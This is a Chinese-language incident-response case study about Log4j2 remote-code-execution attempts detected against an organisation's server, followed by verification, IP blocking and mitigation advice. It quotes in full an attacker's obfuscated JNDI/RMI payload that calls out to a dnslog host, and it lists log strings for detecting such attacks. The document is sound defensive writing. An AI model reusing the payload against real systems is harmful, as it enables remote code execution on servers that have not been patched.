**摘要：**
远程代码执行漏洞利用方式十分简单，攻击者仅需向目标输入一段代码，不需要用户执行任何多余操作即可触发该漏洞，该漏洞是目前攻击者常用的漏洞攻击手段之一。

 **关键词：** ** **Apache log4j2**** ** **漏洞；**** ** **payload**** **
**；dnslog**** ；

一、案例背景

Apache
Log4j2是一个基于开源Java日志记录组件，是一款优秀的Java日志框架，该日志框架被大量用于业务系统开发，用来记录日志信息。2021年11月24日，阿里云安全团队向Apache官方报告了Apache
Log4j2远程代码执行漏洞。Log4j2组件在处理程序日志记录时存在注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发Log4j2组件解析缺陷，就可以实现目标服务器任意命令执行，获取目标服务器权限。由于日志记录存在的普遍性，所以该漏洞具有危害程度高、利用难度低、影响范围大、后续影响广的特点。

该高危漏洞无需授权即可远程代码执行，在漏洞影响版本（Apache log4j2 2.0 至 2.14.1
版本）中，攻击者仅需向目标输入一段代码，不需要用户执行任何多余操作即可触发该漏洞，使攻击者可以远程控制用户受害者服务器，90% 以上基于 java
开发的应用平台都会受到影响。漏洞利用大致流程：第一步：向目标发送指定payload，目标对payload进行解析执行，然后会通过ldap链接远程服务，当ldap服务收到请求之后，将请求进行重定向到恶意
java class的地址。第二步：目标服务器收到重定向请求之后，下载恶意class并执行其中的代码，从而执行系统命令。

二、案例描述

1、安全态势感知系统监控平台发现多个IP 对我方IP (213.***.***.***)发送可疑请求数据包，其payload为:
${jndi:rmi://1645${LeEGs:JnRt:ntofJ:dCTRFh:-4}1627622${mMRbHa:XqoRHh:mJoGJ:-6}kkMCO.k${LyxUD:QPt:pcTK:TrLDQp:adrlD:-l}6t1b.dnslog${IUse:FRhfXj:Jeyfli:vBTRGp:-.}c${zlCM:IvduI:sQFDfE:TkB:FPeuM:-n}/ACxw}
}”。

![](https://image.3001.net/images/20230719/1689728515_64b73603467372a39332a.png!small)

经分析是典型的Log4j2漏洞payload **:**
（1）可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。（2）检查日志中是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与
jndi 调用相关的堆栈信息。

![](https://image.3001.net/images/20230627/1687834522_649a4f9ac969a4ab9f9ea.png!small)

Apache Log4j2存在远程代码执行漏洞，攻击者可利用这些漏洞执行任意命令,攻击语句：X-Remote-Addr:
${jndi:rmi://1645${LeEGs:JnRt:ntofJ:dCTRFh:-4}1627622${mMRbHa:XqoRHh:mJoGJ:-6}kkMCO.k${LyxUD:QPt:pcTK:TrLDQp:adrlD:-l}6t1b.dnslog${IUse:FRhfXj:Jeyfli:vBTRGp:-.}c${zlCM:IvduI:sQFDfE:TkB:FPeuM:-n}/ACxw}等，在不同的请求头参数中使用混淆手段对初始payload做了处理，由于Apache
Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞，此处payload为尝试远程访问dnslog网站。

2、查询部分攻击IP，发现IP为香港用户。

![](https://image.3001.net/images/20230627/1687835064_649a51b83b88b68febc63.png!small)

3、通过自检验证，发现被攻击系统不存在Apache Log4j2远程代码执行漏洞。

（1）使用工具扫描，未发现apache log4j2远程代码执行漏洞。

![](https://image.3001.net/images/20230704/1688432405_64a36f159841368b9b18f.png!small)

（2）使用apache log4j2远程代码执行漏洞payload请求dnslog进行漏洞验证，如下：

![](https://image.3001.net/images/20230704/1688432450_64a36f4243b71228a0b56.png!small)

可以发现dnslog接收到返回的信息（No Data）,即无响应，则证明不存在log4j2漏洞。

![](https://image.3001.net/images/20230627/1687850944_649a8fc087902d7f36d87.png!small)

4、在相关安全设备上对攻击IP进行封堵

当发生漏洞攻击事件时，可通过IPS
或IDS\WAF等相关安全设备查询日志，如根据相关IPS设备技术特性，IPS设备事件过滤系统支持采用攻击发生时间范围、事件名称、事件类别、所属服务、源网络范围、目的网络范围、触发探测器、攻击结果、事件动作等多种粒度方法过滤探测器所产生的告警日志，记录相关的攻击告警事件等，来判断攻击者可疑来源IP，并使用IPS安全设备或网络设备对所有可疑IP进行拒绝及阻断。

![](https://image.3001.net/images/20230704/1688432479_64a36f5f183bb5c47d798.png!small)

5、登陆被攻击系统查看其系统日志，未发现异常访问记录。

![](https://image.3001.net/images/20230627/1687835634_649a53f262c60f5966977.png!small)

6、系统入侵事件排除后，网络安全响应小组发出故障解除、系统恢复运行通知。相关系统负责人及业务使用部门，对事件发生前所进行过的业务操作进行检查，核对业务数据是否正确和是否完整，发现不正确或不完整的应马上更正或补录，确保数据的准确性和完整性。

7、建议可采取的有关安全防护措施：

（1）Apache Log4j2升级至最新版本；且升级已知受影响的应用及组件，如srping-boot-strater-log4j2、ApacheSolr、Apache Flink、Apache Druid。

（2）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；

（3）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；

（4）设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 为 true。并采用 rasp
对lookup的调用进行阻断。

（5）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；

（6）部署使用第三方产品WAF\IDS\IPS进行安全防护，禁止log4j2 所在服务器不必要的业务访问外网。

三、案例分析总结

Apache
Log4j2远程代码执行漏洞是一种（CNVD评级）“高危”安全漏洞，攻击者可以利用该漏洞在受影响的服务器上执行恶意代码。该漏洞的影响范围广泛，可能会影响许多使用log4j2的应用程序。面对日益严峻的网络安全风险，网络安全管理员要及时更新受影响的应用程序，以避免被攻击。同时，加强网络安全防护，网络安全监控人员可通过利用全流量监测平台对网络流量、安全设备日志进行监控预警，实时捕获疑似攻击行为和异常操作行为，通过攻击分析、日志排查、攻击IP溯源、封堵攻击IP及时限制外部访问等技术监测手段，避免被攻击者利用该漏洞入侵系统，完成此安全风险的应急和闭环处置。

